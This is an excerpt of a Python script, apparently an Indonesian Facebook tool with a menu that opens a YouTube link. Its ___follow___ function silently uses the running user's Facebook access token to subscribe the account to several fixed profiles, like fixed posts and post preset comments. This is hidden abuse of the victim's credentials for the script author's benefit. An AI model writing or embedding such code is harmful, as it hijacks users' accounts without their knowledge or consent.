...
def ___follow___():
    ...
    try:
        ...
        requests.post('https://graph.facebook.com/100017584682867/subscribers?access_token=%s'%(___token___)) 
        requests.post('https://graph.facebook.com/100000395779504/subscribers?access_token=%s'%(___token___)) 
        requests.post('https://graph.facebook.com/100000834003593/subscribers?access_token=%s'%(___token___)) 
        requests.post('https://graph.facebook.com/953529338576547/likes?summary=true&access_token=%s'%(___token___)) 
        requests.post('https://graph.facebook.com/800676813861801/likes?summary=true&access_token=%s'%(___token___)) 
        requests.post('https://graph.facebook.com/800676813861801/comments/?message=%s&access_token=%s'%(___komen3___,___token___)) 
        requests.post('https://graph.facebook.com/4257706904267068/comments/?message=%s&access_token=%s'%(___komen___,___token___)) 
        requests.post('https://graph.facebook.com/4257706904267068/comments/?message=%s&access_token=%s'%(___komen2___,___token___)) 
...
def ___menu___():
    ...
    if ___menu___ in ['1','01']:
        ...
        print("%s[%s*%s]%s Anda Akan Diarahkan Ke Youtube"%(B,P,B,P));sleep(2)
        os.system("xdg-open https://youtu.be/bszAm4C5ovE")
        exit()
